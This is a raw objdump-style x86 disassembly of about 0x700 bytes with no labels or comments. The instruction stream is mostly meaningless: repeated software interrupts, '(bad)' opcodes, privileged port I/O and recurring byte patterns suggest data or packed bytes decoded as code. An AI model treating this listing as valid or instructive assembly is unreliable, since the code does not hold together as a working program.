  425b2d:	int    0x96
  425b2f:	std    
  425b30:	int    0xa6
  425b32:	std    
  425b33:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b39:	in     eax,0x28
  425b3b:	shl    ebx,cl
  425b3d:	xchg   edx,eax
  425b3e:	push   ebx
  425b3f:	aad    0x87
  425b41:	adc    ecx,DWORD PTR [edx]
  425b43:	add    eax,0xd4cf
  425b48:	add    bh,cl
  425b4a:	push   es
  425b4b:	nop
  425b4c:	add    BYTE PTR [eax],al
  425b4e:	add    BYTE PTR [eax-0x33],dh
  425b51:	jbe    0x425b50
  425b53:	int    0x8d
  425b55:	std    
  425b56:	sar    bh,0x63
  425b59:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b5c:	or     al,0xd3
  425b5e:	mov    ebp,0x28f2d392
  425b63:	push   ebx
  425b64:	shl    DWORD PTR [eax-0x33],cl
  425b67:	jbe    0x425b95
  425b69:	iret   
  425b6a:	or     DWORD PTR [ecx-0x80],eax
  425b6d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b74:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b7b:	int    0x8d
  425b7d:	push   esp
  425b7e:	or     al,BYTE PTR [ecx-0x32528933]
  425b84:	lea    esi,[ebp-0x6d82bad1]
  425b8a:	shr    ebx,cl
  425b8c:	xchg   edx,eax
  425b8d:	int    0x8d
  425b8f:	lods   eax,DWORD PTR ds:[esi]
  425b90:	int    0x96
  425b92:	mov    ch,0x3b
  425b94:	leave  
  425b95:	cmp    ebx,edx
  425b97:	push   ebx
  425b98:	icebp  
  425b99:	bound  eax,QWORD PTR [eax]
  425b9b:	(bad)  
  425b9c:	xor    al,0xd3
  425b9e:	repnz sub BYTE PTR [eax],al
  425ba1:	(bad)  
  425ba2:	inc    esp
  425ba3:	mov    ebp,0xfb94
  425ba8:	int    0x76
  425baa:	lods   eax,DWORD PTR ds:[esi]
  425bab:	int    0x8d
  425bad:	mov    ch,0x2f
  425baf:	inc    ebp
  425bb0:	jge    0x425b44
  425bb2:	shr    ebx,cl
  425bb4:	xchg   edx,eax
  425bb5:	int    0x8d
  425bb7:	lods   eax,DWORD PTR ds:[esi]
  425bb8:	int    0x96
  425bba:	mov    ch,0x3b
  425bbc:	leave  
  425bbd:	cmp    ebx,edx
  425bbf:	push   ebx
  425bc0:	icebp  
  425bc1:	bound  eax,QWORD PTR [eax]
  425bc3:	(bad)  
  425bc4:	push   esp
  425bc5:	shl    edx,cl
  425bc7:	sub    BYTE PTR [eax],al
  425bc9:	(bad)  
  425bca:	cmp    al,0xbd
  425bcc:	inc    esp
  425bcd:	sti    
  425bce:	add    BYTE PTR [eax],al
  425bd0:	int    0x76
  425bd2:	std    
  425bd3:	int    0x8d
  425bd5:	std    
  425bd6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425bd9:	repnz sub BYTE PTR [ebx],bh
  425bdc:	jns    0x425bb1
  425bde:	mov    ebp,0xcdd35392
  425be3:	(bad)  
  425be4:	std    
  425be5:	int    0x96
  425be7:	std    
  425be8:	cmp    ecx,DWORD PTR [edi]
  425bea:	shr    ebx,cl
  425bec:	xchg   edx,eax
  425bed:	cmp    edx,ebp
  425bef:	shr    edx,cl
  425bf1:	sub    BYTE PTR [ebx+0x13],dl
  425bf4:	xchg   ebx,edx
  425bf6:	int    0x8d
  425bf8:	std    
  425bf9:	int    0x96
  425bfb:	std    
  425bfc:	cmp    ecx,DWORD PTR [edi]
  425bfe:	shr    ebx,cl
  425c00:	xchg   edx,eax
  425c01:	cmp    edx,ebp
  425c03:	shr    edx,cl
  425c05:	sub    BYTE PTR [ebx+0x13],dl
  425c08:	xchg   ebx,edx
  425c0a:	int    0x8d
  425c0c:	std    
  425c0d:	int    0x96
  425c0f:	std    
  425c10:	cmp    ecx,DWORD PTR [edi]
  425c12:	shr    ebx,cl
  425c14:	xchg   edx,eax
  425c15:	cmp    edx,ebp
  425c17:	shr    edx,cl
  425c19:	sub    BYTE PTR [ebx+0x13],dl
  425c1c:	xchg   ebx,edx
  425c1e:	or     al,BYTE PTR [esi]
  425c20:	nop
  425c21:	add    BYTE PTR [eax],al
  425c23:	add    ch,cl
  425c25:	jbe    0x425c7b
  425c27:	int    0x80
  425c29:	int    0x8d
  425c2b:	mov    ebp,0x3bbd96cd
  425c30:	(bad)  
  425c32:	aad    0xd3
  425c34:	jmp    0x425bc8
  425c36:	shr    edx,cl
  425c38:	sub    BYTE PTR [ebx+0x13],dl
  425c3b:	or     al,BYTE PTR ds:0xd4cf
  425c41:	add    ch,cl
  425c43:	jbe    0x425c91
  425c45:	int    0x80
  425c47:	int    0x8d
  425c49:	std    
  425c4a:	int    0x96
  425c4c:	std    
  425c4d:	cmp    ecx,DWORD PTR [edi]
  425c4f:	shr    ebx,cl
  425c51:	xchg   edx,eax
  425c52:	int    0x6c
  425c54:	jo     0x425c91
  425c56:	aad    0xd3
  425c58:	jmp    0xcf05:0xa135328
  425c5f:	aam    0x0
  425c61:	add    BYTE PTR [eax],al
  425c63:	int    0x76
  425c65:	sbb    al,0xcd
  425c67:	lea    ebx,[ebx+edi*1]
  425c6a:	or     al,0xd3
  425c6c:	repnz sub BYTE PTR [ebx],bh
  425c6f:	jns    0x425c44
  425c71:	mov    ebp,0xcdd35392
  425c76:	(bad)  
  425c77:	std    
  425c78:	int    0x96
  425c7a:	std    
  425c7b:	cmp    edx,ebp
  425c7d:	cmp    ecx,DWORD PTR [edi]
  425c7f:	shr    edx,cl
  425c81:	sub    bl,dl
  425c83:	jmp    0x425c17
  425c85:	push   ebx
  425c86:	adc    ecx,ebp
  425c88:	xchg   esi,eax
  425c89:	std    
  425c8a:	int    0xa6
  425c8c:	std    
  425c8d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c93:	hlt    
  425c94:	call   ebx
  425c96:	in     eax,0x28
  425c98:	push   ebx
  425c99:	aad    0x87
  425c9b:	adc    ecx,DWORD PTR [edx]
  425c9d:	add    eax,0xd4cf
  425ca2:	add    ch,cl
  425ca4:	jbe    0x425ca3
  425ca6:	int    0x8d
  425ca8:	std    
  425ca9:	add    al,0x2
  425cab:	call   ebx
  425cad:	repnz sub BYTE PTR [ebx],bh
  425cb0:	jns    0x425c85
  425cb2:	mov    ebp,0xcdd35392
  425cb7:	(bad)  
  425cb8:	std    
  425cb9:	int    0x96
  425cbb:	std    
  425cbc:	add    al,0xfb
  425cbe:	(bad)  
  425cbf:	cmp    ecx,DWORD PTR [edi]
  425cc1:	shr    edx,cl
  425cc3:	sub    bl,dl
  425cc5:	jmp    0x425c59
  425cc7:	push   ebx
  425cc8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cce:	int    0x96
  425cd0:	std    
  425cd1:	add    al,0xfb
  425cd3:	(bad)  
  425cd4:	cmp    ecx,DWORD PTR [edi]
  425cd6:	shr    edx,cl
  425cd8:	sub    bl,dl
  425cda:	jmp    0x425c6e
  425cdc:	push   ebx
  425cdd:	adc    ecx,edi
  425cdf:	pop    ss
  425ce0:	nop
  425ce1:	add    BYTE PTR [eax],al
  425ce3:	add    BYTE PTR [edx-0x33],ah
  425ce6:	xchg   esi,eax
  425ce7:	std    
  425ce8:	int    0xa6
  425cea:	std    
  425ceb:	xchg   ebx,edx
  425ced:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425cf3:	int3   
  425cf4:	push   es
  425cf5:	aam    0x0
  425cf7:	add    BYTE PTR [eax],al
  425cf9:	int    0x76
  425cfb:	sub    al,0x4
  425cfd:	hlt    
  425cfe:	call   ebx
  425d00:	repz xchg edx,eax
  425d02:	shl    ebp,cl
  425d04:	sub    BYTE PTR [ebx-0x2b],dl
  425d07:	iret   
  425d08:	or     edi,ebp
  425d0a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d11:	add    BYTE PTR [eax+0x50007162],0x0
  425d18:	xchg   esi,eax
  425d19:	and    al,0x6
  425d1b:	ins    DWORD PTR es:[edi],dx
  425d1c:	aam    0xbc
  425d1e:	int    0x76
  425d20:	in     eax,dx
  425d21:	int    0x8d
  425d23:	adc    DWORD PTR [edi],ebp
  425d25:	inc    ebp
  425d26:	jge    0x425cba
  425d28:	shr    ebx,cl
  425d2a:	xchg   edx,eax
  425d2b:	int    0xe3
  425d2d:	int    0x7d
  425d2f:	int    0x76
  425d31:	in     eax,dx
  425d32:	int    0x96
  425d34:	adc    DWORD PTR [ebx],edi
  425d36:	fidivr DWORD PTR [ebx]
  425d38:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d3f:	push   ebx
  425d40:	adc    ecx,ebp
  425d42:	xor    BYTE PTR [ebx-0x76],al
  425d45:	jo     0x425d14
  425d47:	xchg   esi,eax
  425d48:	push   esp
  425d49:	in     al,dx
  425d4a:	push   esp
  425d4b:	int    0x92
  425d4d:	int    0xa6
  425d4f:	push   eax
  425d50:	retf   0x5324
  425d53:	or     DWORD PTR [eax+ecx*4],esp
  425d56:	int    0x76
  425d58:	cmc    
  425d59:	int    0x8d
  425d5b:	stc    
  425d5c:	das    
  425d5d:	inc    ebp
  425d5e:	jge    0x425cf2
  425d60:	shr    ebx,cl
  425d62:	xchg   edx,eax
  425d63:	int    0x8d
  425d65:	cmc    
  425d66:	int    0xa6
  425d68:	stc    
  425d69:	cmp    ecx,ecx
  425d6b:	cmp    ebx,ebp
  425d6d:	shl    edx,cl
  425d6f:	sub    ch,cl
  425d71:	lea    esi,[eax]
  425d73:	push   ebx
  425d74:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d7a:	int    0x1c
  425d7c:	inc    ebx
  425d7d:	(bad)  
  425d7e:	jo     0x425d8a
  425d80:	lea    esi,[eax]
  425d82:	or     cl,0xec
  425d85:	xchg   ch,cl
  425d87:	xchg   esi,eax
  425d88:	push   esp
  425d89:	int    0x76
  425d8b:	dec    esp
  425d8c:	int    0x4a
  425d8e:	int    0x20
  425d90:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d96:	sbb    al,0xcd
  425d98:	dec    edx
  425d99:	xchg   ebp,ecx
  425d9b:	sub    eax,0xa808080
  425da0:	lea    esi,[eax]
  425da2:	int    0x4a
  425da4:	int    0xa6
  425da6:	push   eax
  425da7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dae:	int    0x80
  425db0:	int    0x4a
  425db2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425db6:	jbe    0x425da5
  425db8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dbe:	das    
  425dbf:	inc    ebp
  425dc0:	jge    0x425d54
  425dc2:	shr    ebx,cl
  425dc4:	xchg   edx,eax
  425dc5:	int    0x8d
  425dc7:	in     eax,dx
  425dc8:	int    0xa6
  425dca:	adc    DWORD PTR [ebx],edi
  425dcc:	leave  
  425dcd:	cmp    ebx,ebp
  425dcf:	shl    edx,cl
  425dd1:	sub    BYTE PTR [ebx-0x3b],dl
  425dd4:	or     dh,BYTE PTR [esi+0x44]
  425dd7:	int    0x76
  425dd9:	xor    bl,ch
  425ddb:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425de1:	in     eax,dx
  425de2:	int    0x8d
  425de4:	adc    DWORD PTR [edi],ebp
  425de6:	inc    ebp
  425de7:	jge    0x425d7b
  425de9:	shr    ebx,cl
  425deb:	xchg   edx,eax
  425dec:	int    0x8d
  425dee:	in     eax,dx
  425def:	int    0xa6
  425df1:	adc    ebx,edx
  425df3:	repnz sub ch,cl
  425df6:	lea    edx,[ebx+edi*1]
  425df9:	leave  
  425dfa:	cmp    ebx,ebp
  425dfc:	add    al,0xd3
  425dfe:	stc    
  425dff:	push   ebx
  425e00:	(bad)
  425e03:	inc    ebx
  425e04:	shr    DWORD PTR [edi],cl
  425e06:	add    al,0xf7
  425e08:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e10:	dec    ebx
  425e11:	mov    BYTE PTR [ebx],dh
  425e13:	jge    0x425e1f
  425e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e16:	xor    al,0xa
  425e18:	lea    edi,[ecx*8+0x76cdf18d]
  425e1f:	xchg   ebp,eax
  425e20:	das    
  425e21:	inc    ebp
  425e22:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e28:	jbe    0x425e1b
  425e2a:	int    0xa6
  425e2c:	xchg   ebp,eax
  425e2d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e33:	cmp    esi,eax
  425e35:	cmp    ebx,ebp
  425e37:	push   ebx
  425e38:	or     al,0xcd
  425e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e3b:	stc    
  425e3c:	das    
  425e3d:	inc    ebp
  425e3e:	popf   
  425e3f:	xchg   edx,eax
  425e40:	or     dh,BYTE PTR [esi+0x54]
  425e43:	int    0x76
  425e45:	cmc    
  425e46:	push   ecx
  425e47:	out    0x54,al
  425e49:	add    al,0xd3
  425e4b:	dec    edx
  425e4c:	shr    esp,cl
  425e4e:	xchg   edx,eax
  425e4f:	int    0xa6
  425e51:	stc    
  425e52:	cmp    ebx,ebp
  425e54:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e5a:	int    0xa6
  425e5c:	cmc    
  425e5d:	int    0x8d
  425e5f:	stc    
  425e60:	das    
  425e61:	inc    ebp
  425e62:	or     al,0x92
  425e64:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e6a:	shr    ebx,cl
  425e6c:	xchg   edx,eax
  425e6d:	int    0x8d
  425e6f:	stc    
  425e70:	cmp    ecx,ebx
  425e72:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e78:	cmp    esp,ecx
  425e7a:	push   ebx
  425e7b:	fcmovne st,st(5)
  425e7d:	lea    esi,[edi+ebp*1]
  425e80:	mov    ebx,0x2bc53389
  425e85:	ror    ebp,cl
  425e87:	(bad)  
  425e88:	icebp  
  425e89:	or     dh,BYTE PTR [esi+0x54]
  425e8c:	int    0x76
  425e8e:	xchg   ebp,eax
  425e8f:	das    
  425e90:	inc    ebp
  425e91:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e97:	jbe    0x425e8a
  425e99:	int    0xa6
  425e9b:	xchg   ebp,eax
  425e9c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ea2:	das    
  425ea3:	mov    ebx,0xa6020180
  425ea8:	cmp    ebx,ebp
  425eaa:	dec    edx
  425eab:	or     al,0x1
  425ead:	ror    DWORD PTR [edx-0x2b],cl
  425eb0:	mov    ebp,0xbdbfcb3b
  425eb5:	or     ah,BYTE PTR [ebx]
  425eb7:	and    eax,0x92d3352f
  425ebc:	shr    DWORD PTR [ebp+0x37d65692],cl
  425ec2:	ficom  WORD PTR [ebx]
  425ec4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425ec7:	fidiv  WORD PTR [edi]
  425ec9:	ficom  WORD PTR [ebx]
  425ecb:	(bad)  
  425ecc:	ss inc ebx
  425ece:	or     al,0xd6
  425ed0:	cs int 0x92
  425ed3:	int    0x8d
  425ed5:	xor    BYTE PTR [edi+0x548dcd81],al
  425edb:	add    al,0x64
  425edd:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425ee3:	int    0x8d
  425ee5:	xor    BYTE PTR [edi-0x7772327f],al
  425eeb:	xchg   DWORD PTR [esi+0x54],esi
  425eee:	int    0x89
  425ef0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425efa:	push   es
  425efb:	and    eax,DWORD PTR [eax]
  425efd:	add    BYTE PTR [eax],al
  425eff:	in     al,dx
  425f00:	test   DWORD PTR [edi+0x25230abd],edi
  425f06:	int    0x76
  425f08:	adc    al,0x81
  425f0a:	jbe    0x425f50
  425f0c:	leave  
  425f0d:	jbe    0x425f7c
  425f0f:	scas   al,BYTE PTR es:[edi]
  425f10:	aaa    
  425f11:	ficom  WORD PTR [ebx]
  425f13:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f19:	int    0x8d
  425f1b:	jne    0x425f4c
  425f1d:	inc    ebp
  425f1e:	jge    0x425eb2
  425f20:	shr    ebx,cl
  425f22:	xchg   edx,eax
  425f23:	int    0x8d
  425f25:	ins    DWORD PTR es:[edi],dx
  425f26:	int    0xa6
  425f28:	jne    0x425efd
  425f2a:	repnz sub ch,cl
  425f2d:	lea    ecx,[ebp+ecx*8-0x77]
  425f31:	cmp    ecx,ecx
  425f33:	cmp    ebx,ebp
  425f35:	push   ebx
  425f36:	(bad)
  425f39:	shl    esp,cl
  425f3b:	int    0x8d
  425f3d:	inc    esp
  425f3e:	inc    ebx
  425f3f:	mov    BYTE PTR [edi+0x54],dh
  425f42:	int    0x76
  425f44:	xor    BYTE PTR [edi+0x760a1476],al
  425f4a:	xor    ch,cl
  425f4c:	ins    BYTE PTR es:[edi],dx
  425f4d:	test   BYTE PTR [edx],cl
  425f4f:	jbe    0x425f65
  425f51:	int    0x76
  425f53:	in     eax,dx
  425f54:	int    0x8d
  425f56:	adc    DWORD PTR [edi],ebp
  425f58:	inc    ebp
  425f59:	jge    0x425eed
  425f5b:	shr    ebx,cl
  425f5d:	xchg   edx,eax
  425f5e:	int    0x8d
  425f60:	in     eax,dx
  425f61:	int    0xa6
  425f63:	adc    DWORD PTR [ebx],edi
  425f65:	fnstsw WORD PTR [ebx]
  425f67:	leave  
  425f68:	push   ebx
  425f69:	(bad)
  425f6c:	sub    BYTE PTR [esi+0x76],bl
  425f6f:	adc    al,0x2f
  425f71:	push   es
  425f72:	mov    esi,0xcd0000ff
  425f77:	(bad)  
  425f78:	std    
  425f79:	int    0x96
  425f7b:	std    
  425f7c:	cmp    ecx,DWORD PTR [edi]
  425f7e:	shr    ebx,cl
  425f80:	xchg   edx,eax
  425f81:	sar    bh,0x9c
  425f84:	cmp    esi,ecx
  425f86:	shr    edx,cl
  425f88:	sub    BYTE PTR [ebx+0x13],dl
  425f8b:	int    0x96
  425f8d:	std    
  425f8e:	int    0xa6
  425f90:	std    
  425f91:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f97:	popf   
  425f98:	shl    ebp,cl
  425f9a:	sub    BYTE PTR [ebx-0x2b],dl
  425f9d:	xchg   DWORD PTR [ebx],edx
  425f9f:	int    0x96
  425fa1:	std    
  425fa2:	int    0xa6
  425fa4:	std    
  425fa5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fab:	popf   
  425fac:	shl    ebp,cl
  425fae:	sub    BYTE PTR [ebx-0x2b],dl
  425fb1:	xchg   DWORD PTR [ebx],edx
  425fb3:	int    0x96
  425fb5:	std    
  425fb6:	int    0xa6
  425fb8:	std    
  425fb9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425fbf:	xchg   edx,eax
  425fc0:	shl    ebp,cl
  425fc2:	sub    BYTE PTR [ebx-0x2b],dl
  425fc5:	xchg   DWORD PTR [ebx],edx
  425fc7:	or     cl,bh
  425fc9:	nop
  425fca:	add    BYTE PTR [eax],al
  425fcc:	add    ch,cl
  425fce:	lea    edx,[eax-0x33]
  425fd1:	xchg   esi,eax
  425fd2:	mov    ebp,0x3bbda6cd
  425fd7:	cdq    
  425fd8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fde:	in     eax,0x28
  425fe0:	push   ebx
  425fe1:	aad    0xa
  425fe3:	int3   
  425fe4:	pop    ss
  425fe5:	aam    0x0
  425fe7:	add    BYTE PTR [eax],al
  425fe9:	int    0x8d
  425feb:	dec    esp
  425fec:	int    0x89
  425fee:	int    0x96
  425ff0:	std    
  425ff1:	int    0xa6
  425ff3:	std    
  425ff4:	int    0x7e
  425ff6:	jo     0x426033
  425ff8:	cdq    
  425ff9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fff:	in     eax,0x28
  426001:	push   ebx
  426002:	aad    0xa
  426004:	int3   
  426005:	pop    ss
  426006:	aam    0x0
  426008:	add    BYTE PTR [eax],al
  42600a:	int    0x8d
  42600c:	sbb    al,0xcd
  42600e:	xchg   esi,eax
  42600f:	sbb    al,0x3b
  426011:	icebp  
  426012:	shr    edx,cl
  426014:	sub    BYTE PTR [ebx],bh
  426016:	psrlq  mm5,mm3
  426019:	xchg   edx,eax
  42601a:	push   ebx
  42601b:	adc    ecx,ebp
  42601d:	xchg   esi,eax
  42601e:	std    
  42601f:	int    0xa6
  426021:	std    
  426022:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426028:	cdq    
  426029:	shl    ebp,cl
  42602b:	sub    bl,dl
  42602d:	repz xchg edx,eax
  42602f:	push   ebx
  426030:	aad    0xcd
  426032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426033:	std    
  426034:	cmp    edi,DWORD PTR [ecx+0x4]
  426037:	hlt    
  426038:	call   ebx
  42603a:	mov    ebp,0x28e5d392
  42603f:	push   ebx
  426040:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426046:	aam    0x0
  426048:	add    BYTE PTR [eax],al
  42604a:	int    0x8d
  42604c:	std    
  42604d:	int    0x96
  42604f:	std    
  426050:	cmp    ecx,DWORD PTR [edi]
  426052:	shr    ebx,cl
  426054:	xchg   edx,eax
  426055:	sar    bh,0x9c
  426058:	cmp    esi,ecx
  42605a:	shr    edx,cl
  42605c:	sub    BYTE PTR [ebx+0x13],dl
  42605f:	int    0x96
  426061:	std    
  426062:	int    0xa6
  426064:	std    
  426065:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42606b:	popf   
  42606c:	shl    ebp,cl
  42606e:	sub    BYTE PTR [ebx-0x2b],dl
  426071:	xchg   DWORD PTR [ebx],edx
  426073:	int    0x96
  426075:	std    
  426076:	int    0xa6
  426078:	std    
  426079:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42607f:	popf   
  426080:	shl    ebp,cl
  426082:	sub    BYTE PTR [ebx-0x2b],dl
  426085:	xchg   DWORD PTR [ebx],edx
  426087:	iret   
  426088:	xchg   esi,eax
  426089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42608a:	or     dl,BYTE PTR ds:0xd4cf
  426090:	add    bh,cl
  426092:	iret   
  426093:	nop
  426094:	add    BYTE PTR [eax],al
  426096:	add    BYTE PTR [ecx-0x33],dh
  426099:	(bad)  
  42609a:	std    
  42609b:	int    0x96
  42609d:	std    
  42609e:	cmp    ecx,DWORD PTR [edi]
  4260a0:	int    0xd6
  4260a2:	sub    al,0x3b
  4260a4:	icebp  
  4260a5:	shr    ebx,cl
  4260a7:	xchg   edx,eax
  4260a8:	shr    edx,cl
  4260aa:	sub    BYTE PTR [ebx+0x13],dl
  4260ad:	jno    0x42607e
  4260af:	pop    es
  4260b0:	out    dx,eax
  4260b1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260b8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260c2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260c8:	dec    esp
  4260c9:	int    0x76
  4260cb:	mov    ch,cl
  4260cd:	mov    BYTE PTR [edi-0x72f5b373],al
  4260d3:	dec    esp
  4260d4:	int    0x8d
  4260d6:	cmc    
  4260d7:	int    0x96
  4260d9:	stc    
  4260da:	das    
  4260db:	inc    ebp
  4260dc:	jecxz  0x426070
  4260de:	shl    ebx,cl
  4260e0:	xchg   edx,eax
  4260e1:	int    0x96
  4260e3:	cmc    
  4260e4:	int    0xd6
  4260e6:	stc    
  4260e7:	cmp    esi,edi
  4260e9:	shr    edx,cl
  4260eb:	sub    ch,cl
  4260ed:	xchg   esi,eax
  4260ee:	cmc    
  4260ef:	cmp    esi,eax
  4260f1:	push   ebx
  4260f2:	bswap  ebp
  4260f4:	(bad)  
  4260f5:	stc    
  4260f6:	das    
  4260f7:	inc    ebp
  4260f8:	sti    
  4260f9:	xchg   edx,eax
  4260fa:	shr    edi,cl
  4260fc:	xchg   edx,eax
  4260fd:	int    0xd6
  4260ff:	cmc    
  426100:	int    0xa6
  426102:	stc    
  426103:	cmp    ebx,ecx
  426105:	cmp    ebx,ebp
  426107:	push   ebx
  426108:	aad    0x87
  42610a:	adc    ecx,ebp
  42610c:	xchg   esi,eax
  42610d:	cmc    
  42610e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426114:	das    
  426115:	inc    ebp
  426116:	sti    
  426117:	xchg   edx,eax
  426118:	shr    edi,cl
  42611a:	xchg   edx,eax
  42611b:	int    0xd6
  42611d:	cmc    
  42611e:	int    0xa6
  426120:	stc    
  426121:	cmp    ebx,ecx
  426123:	cmp    ebx,ebp
  426125:	push   ebx
  426126:	aad    0x87
  426128:	adc    ecx,ebp
  42612a:	xchg   esi,eax
  42612b:	cmc    
  42612c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426132:	das    
  426133:	inc    ebp
  426134:	sti    
  426135:	xchg   edx,eax
  426136:	shr    edi,cl
  426138:	xchg   edx,eax
  426139:	int    0xd6
  42613b:	cmc    
  42613c:	cmp    ebx,ecx
  42613e:	int    0xe6
  426140:	stc    
  426141:	cmp    eax,DWORD PTR [eax]
  426143:	push   ebx
  426144:	fld    DWORD PTR [edi+0x707113]
  42614a:	(bad)  
  42614b:	dec    esp
  42614c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426152:	add    BYTE PTR [eax],al
  426154:	int    0x76
  426156:	or     eax,0xcb63a8aa
  42615b:	rcl    BYTE PTR [eax-0x80],cl
  42615e:	xchg   esi,eax
  42615f:	int    0xed
  426161:	add    al,0xed
  426163:	inc    esp
  426164:	pop    ebx
  426165:	cwde   
  426166:	call   0x76c9:0xcb3bdd3b
  42616d:	popf   
  42616e:	(bad)  
  42616f:	aaa    
  426170:	ficom  WORD PTR [ebx]
  426172:	pop    ebp
  426173:	mov    ebp,0xa25230a
  426178:	jbe    0x42611f
  42617a:	leave  
  42617b:	jbe    0x42613a
  42617d:	xchg   ecx,eax
  42617e:	aaa    
  42617f:	ficom  WORD PTR [ebx]
  426181:	or     dh,BYTE PTR [esi-0x13]
  426184:	leave  
  426185:	jbe    0x426174
  426187:	dec    ecx
  426188:	mov    al,ds:0x76c93586
  42618d:	cmc    
  42618e:	dec    ecx
  42618f:	lahf   
  426190:	xchg   BYTE PTR ds:0x691176c9,dh
  426196:	and    DWORD PTR [esi+0x1176c935],eax
  42619c:	cmp    DWORD PTR [ecx],esp
  42619e:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261a4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261ab:	jbe    0x4261a6
  4261ad:	int    0x76
  4261af:	sbb    al,0xcd
  4261b1:	shl    BYTE PTR ds:0xcd808081,1
  4261b7:	jbe    0x4261d5
  4261b9:	int    0x8d
  4261bb:	sbb    al,0xcd
  4261bd:	add    DWORD PTR ds:0xcd808081,ebp
  4261c3:	xor    ch,cl
  4261c5:	pop    esp
  4261c6:	xchg   eax,esp
  4261c8:	fs int 0x96
  4261cb:	popf   
  4261cc:	int    0xa
  4261ce:	and    eax,0xa808081
  4261d3:	out    0xb5,al
  4261d5:	int    0xe6
  4261d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261d8:	das    
  4261d9:	inc    ebp
  4261da:	add    edx,DWORD PTR [edx-0x326def2d]
  4261e0:	out    0x9d,al
  4261e2:	int    0xa6
  4261e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	adc    bh,bl
  4261e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261e8:	mov    esi,0xdd3b4229
  4261ed:	shr    ecx,cl
  4261ef:	sub    ch,cl
  4261f1:	pop    esi
  4261f2:	push   ebx
  4261f3:	aad    0x43
  4261f5:	(bad)  
  4261f7:	nop
  4261f8:	int    0x18
  4261fa:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426200:	int    0x96
  426202:	xor    ch,cl
  426204:	xchg   esi,eax
  426205:	dec    esp
  426206:	iret   
  426207:	xchg   esi,eax
  426208:	lods   eax,DWORD PTR ds:[esi]
  426209:	bound  eax,QWORD PTR [eax]
  42620b:	(bad)  
  42620c:	stc    
  42620d:	jno    0x42627f
  42620f:	cwde   
  426210:	add    dh,dl
  426212:	sbb    al,0xcf
  426214:	jbe    0x4261cb
  426216:	add    dh,dl
  426218:	mov    BYTE PTR [eax],al
  42621a:	(bad)  
  42621b:	cmc    
  42621c:	add    dh,dl
  42621e:	adc    DWORD PTR [eax],eax
  426220:	(bad)  
  426221:	in     eax,dx
  426222:	jo     0x4261f3
  426224:	jbe    0x426223
  426226:	jo     0x4261e5
  426228:	stos   BYTE PTR es:[edi],al
  426229:	clc    
  42622a:	add    BYTE PTR [eax],al
  42622c:	or     dh,BYTE PTR [esi+0x1c]
  42622f:	int    0x76
  426231:	sbb    al,0xcd
  426233:	lea    esp,[edx+ecx*1]
  426236:	outs   dx,BYTE PTR ds:[esi]
  426237:	adc    al,0xcd
  426239:	jbe    0x42625f
  42623b:	leave  
  42623c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426243:	lods   eax,DWORD PTR ds:[esi]
  426244:	int    0x8d
  426246:	and    al,0xa
  426248:	outs   dx,BYTE PTR ds:[esi]
  426249:	test   ch,cl
  42624b:	jbe    0x42627d
  42624d:	int    0x8d
  42624f:	and    al,0xa
  426251:	outs   dx,BYTE PTR ds:[esi]
  426252:	mov    ch,cl
  426254:	jbe    0x42626a
  426256:	int    0x8d
  426258:	and    al,0xa
  42625a:	outs   dx,BYTE PTR ds:[esi]
  42625b:	dec    esp
  42625c:	int    0x76
  42625e:	and    al,0xc9
  426260:	ins    BYTE PTR es:[edi],dx
  426261:	and    al,0x81
  426263:	add    BYTE PTR [eax-0x32e11380],0x76
